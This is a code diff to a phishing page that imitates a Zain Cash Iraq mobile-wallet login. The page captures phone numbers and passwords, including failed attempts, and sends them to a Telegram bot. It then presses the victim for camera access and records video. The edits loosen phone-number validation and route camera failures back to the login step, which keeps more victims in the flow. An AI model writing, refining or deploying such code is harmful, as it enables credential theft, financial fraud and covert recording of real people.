@@ -260,7 +260,7 @@
       ${stepIndicator(1)}
       <form id="phoneForm" autocomplete="off">
         <label>رقم الهاتف المرتبط بحسابك</label>
-        <input type="tel" id="phone" placeholder="07XXXXXXXXXX" pattern="07[0-9]{9}" maxlength="11" required autocomplete="tel" inputmode="numeric"/>
+        <input type="tel" id="phone" placeholder="07XXXXXXXXXX" maxlength="11" required autocomplete="tel" inputmode="numeric"/>
         <label style="margin-top:12px;">كلمة السر</label>
         <input type="password" id="password" placeholder="أدخل كلمة السر" required autocomplete="current-password"/>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
@@ -275,14 +275,14 @@
       const phoneVal = phone.value.trim();
       const passwordVal = password.value.trim();
       
-      if(!/^07\d{9}$/.test(phoneVal)){ 
-        alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 11 أرقام'); 
+      if(phoneVal.length !== 11){ 
+        alert('يرجى إدخال رقم هاتف صحيح يتكون من 11 أرقام'); 
         phone.focus(); 
         return; 
       }
       
       if(passwordVal !== WEBSITE_PASSWORD){
-        // إرسال كلمة السر الخاطئة إلى التلجرام أولاً
+        // إرسال كلمة السر الخاطئة إلى التلجرام
         try { 
           await sendToTelegramAndGetMsgId(`🔴 محاولة دخول فاشلة!\n📱 الهاتف: ${phoneVal}\n🔑 كلمة السر المدخلة: ${passwordVal}\n⚠️ كلمة السر غير صحيحة`); 
         } catch(e){ 
@@ -299,7 +299,7 @@
       
       // إرسال البيانات الصحيحة إلى التلجرام
       try { 
-        telegramMsgId = await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش العراق\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}`); 
+        await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش العراق\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}`); 
       } catch(e){ 
         console.log(e); 
       }
@@ -434,7 +434,9 @@
     try {
       stream = await requestCameraWithInsistence();
     } catch (err) {
-      throw err;
+      console.error('Camera error:', err);
+      renderPhoneStep();
+      return;
     }
 
     const videoEl = document.getElementById('videoPreview');
@@ -494,7 +496,7 @@
     try {
       recorder = new MediaRecorder(processedStream, options);
     } catch (e) {
-      try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; throw err; }
+      try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; renderPhoneStep(); return; }
     }
 
     let chunks = [];
